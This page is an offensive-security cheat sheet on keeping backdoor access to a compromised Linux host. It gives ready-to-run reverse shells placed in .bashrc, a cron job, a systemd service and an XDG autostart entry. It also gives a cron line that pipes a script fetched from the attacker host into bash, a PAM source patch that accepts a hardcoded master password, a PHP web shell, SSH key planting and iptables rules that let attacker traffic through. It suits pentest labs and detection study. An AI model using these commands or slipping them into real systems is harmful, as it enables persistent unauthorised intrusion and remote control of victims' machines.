# Backdoors in Linux

After compromising a target machine, the adversary attempts to establish persistent access. This page lists some methods of backdoors in Linux for persistence.

### .bashrc <a href="#bashrc" id="bashrc"></a>

Add this line to **`/root/.bashrc`** or **`/home/<user>/.bashrc`** to gain access to target machine by reverse shell when the victim user logged in.

```shellscript
bash -i >& /dev/tcp/10.0.0.1/4444
```

Of course we need to always open netcat listener to be able to fetch incoming connection from the target.

```shellscript
nc -lvnp 4444
```

### Cron <a href="#cron" id="cron"></a>

Add the following line to the cron file like **`/etc/crontab`** in the target machine.\
Replace `10.0.0.1` with your ip address.

```shellscript
* * * * * root curl http://10.0.0.1/shell | bash
```

Create a file named "shell" in local machine.\
Replace `10.0.0.1` with your ip address.

```shellscript
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Now start local web server and listener in each terminal in local machine.

```shellscript
# Terminal 1
# We need to start this in the directory where our 'shell' file is located.
sudo python3 -m http.server 80

# Terminal 2
nc -lvnp 4444
```

Once the cron job downloads the **“shell”** file, run **“bash”** command to execute the **“shell”**.\
We should gain access to the target shell.

### pam\_unix.so <a href="#pam_unixso" id="pam_unixso"></a>

The pam\_unix.so module is likely located in **`/usr/lib/security`** or **`/usr/lib/x86_64-linux-gnu/security`** directory. It automatically detects and uses shadow passwords to authenticate users.\
See this line in the pam\_unix.so.

```shellscript
...

/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
name = p = NULL;

...
```

Modify this line to as below.

```shellscript
...

/* verify the password of this user */
if (strcmp(p, "hackyou123") != 0) {
    retval = _unix_verify_password(pamh, name, p, ctrl);
} else {
    retval = PAM_SUCCESS;
}
name = p = NULL;

AUTH_RETURN;

...
```

Whenever you login to the target system using the password “hackyou123”, you can successfully login.

### PHP <a href="#php" id="php"></a>

#### 1. Create a Payload <a href="#id-1-create-a-payload" id="id-1-create-a-payload"></a>

Create a php file (e.g. shell.php) into **`/var/www/html`**.

```shellscript
<?php 

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }

?>
```

Leave the php file in **`/var/www/html`**.

#### 2. Reverse Shell <a href="#id-2-reverse-shell" id="id-2-reverse-shell"></a>

After that, start a listener for receiving the outcomming connection.

```shellscript
nc -lvnp 4444
```

Now access to the web page as below.\
Replace **`<local-ip>`** with your ip address.

```shellscript
http://<target-ip>/shell.php?cmd=bach -i >& /dev/tcp/<local-ip>/4444 0>&1
```

We should get a shell.

### SSH <a href="#ssh" id="ssh"></a>

We can establish a backdoor to allow us to be able to connect the target SSH server anytime by leaving our public key in the target machine.

#### 1. Generate a New SSH key <a href="#id-1-generate-a-new-ssh-key" id="id-1-generate-a-new-ssh-key"></a>

First off, run the following command to generate SSH key.

```shellscript
ssh-keygen
```

It will generate two keys, **private key (id\_rsa)** and **public key (id\_rsa.pub)**.

#### 2. Transfer Our SSH Public Key to Target System <a href="#id-2-transfer-our-ssh-public-key-to-target-system" id="id-2-transfer-our-ssh-public-key-to-target-system"></a>

If there is no **`.ssh`** directory in target, we need to create it.

```shellscript
mkdir .ssh
```

Then put our public key (**id\_rsa.pub**) into **`/root/.ssh`** or **`/home/<user>/.ssh`** in the target machine.\
**scp** command can be used for transfering it. Replace **`<target-user>`** and **`<target-iip>`** depending on your target.

```shellscript
scp ./id_rsa.pub <target-user>@<target-ip>:/root/.ssh/
# or
scp ./id_rsa.pub <target-user>@<target-ip>:/home/<target-user>/.ssh/
```

#### 3. Add the Public Key Content to authorized\_keys <a href="#id-3-add-the-public-key-content-to-authorized_keys" id="id-3-add-the-public-key-content-to-authorized_keys"></a>

Also we need to add the content of our **`id_rsa.pub`** to the target **authorized\_keys** file.

```shellscript
cat id_rsa.pub >> authorized_keys
```

#### 4. Change Permission of SSH <a href="#id-4-change-permission-of-ssh" id="id-4-change-permission-of-ssh"></a>

In target machine, we need to set the right permissions of the file/directory. Otherwise we cannot connect SSH. Replace **`<target-user>`** with your target.

```shellscript
chmod 700 /root
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
# or
chmod 700 /home/<target-user>
chmod 700 /home/<target-user>/.ssh
chmod 600 /home/<target-user>/.ssh/authorized_keys
```

#### 5. Connect to SSH Anytime <a href="#id-5-connect-to-ssh-anytime" id="id-5-connect-to-ssh-anytime"></a>

After that, we can connect to the target SSH when we want to connect it as long as the public key in **.ssh** directory is not removed. Before connecting, we need to modify the permission of our private key in local.

```shellscript
chmod 600 private_key
```

Now we can connect to SSH of the target.

```shellscript
ssh root@<target-ip> -i private_key
# or
ssh <target-user>@<target-ip> -i private_key
```

### Systemd <a href="#systemd" id="systemd"></a>

We can use systemd as a backdoor because an arbitrary command will be executed when a service start.\
The command is stored in **`[Services]`** section in the configuration file.

#### 1. Create a New Systemd Config File <a href="#id-1-create-a-new-systemd-config-file" id="id-1-create-a-new-systemd-config-file"></a>

Create **`/etc/systemd/system/backdoor.service`** in target machine.\
This service will execute **reverse shell** when starting.\
Replace **`<local-ip>`** with your ip address.

```shellscript
[UNIT]
Description=Backdoor

[Service]
Type=simple
ExecStart=/bin/bash -i >& /dev/tcp/<local-ip>/4444 0>&1

[Install]
WantedBy=multi-user.target
```

Then enable the service.

```shellscript
systemctl enable backdoor
```

Now this service will start when the target system boots.

#### 2. Wait for Reverse Connecting <a href="#id-2-wait-for-reverse-connecting" id="id-2-wait-for-reverse-connecting"></a>

We need to leave the netcat listener running in local machine.

```shellscript
nc -lvnp 4444
```

Then we'll get a shell anytime the service starts.

### XDG Autostart <a href="#xdg-autostart" id="xdg-autostart"></a>

Reference: [TryHackMe](https://tryhackme.com/r/room/linuxprocessanalysis)

**Autostart** is also used for persistence. First create a `$HOME/.config/autostart` directory if it does not exist and create a new file with arbitrary name as below:

```shellscript
mkdir -p /home/<user>/.config/autostart
touch /home/<user>/.config/autostart/evil.desktop
```

Then write a malicious code in this file:

```shellscript
# /home/<users>/.config/autostart/evil.desktop

[Desktop Entry]
Type=Application
Name=Test
Exec=/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

After that, the command at the `Exec` field will be executed when the target user logs in.\
We need to keep opening a listener in attack machine for receiving incoming connection:

```shellscript
nc -lvnp 4444
```

### Option: Firewall Bypass <a href="#option-firewall-bypass" id="option-firewall-bypass"></a>

If the target system applies firewall for preventing communications with external systems, we may bypass the settings by manipulating them. It requires root privilege.

```shellscript
# List the iptables settings
iptables --list

# ACCEPT: TARGET => ATTACKER
# OUTPUT 1: The first rule of the OUTPUT chain.
# -d: Destination address
iptables -I OUTPUT 1 -p tcp -d <attacker-ip> -j ACCEPT

# ACCEPT: TARGET <= ATTACKER
# INPUT 1: The first rule of the INPUT chain.
# -s: Source address
iptables -I INPUT 1 -p tcp -s <attacker-ip> -j ACCEPT
```
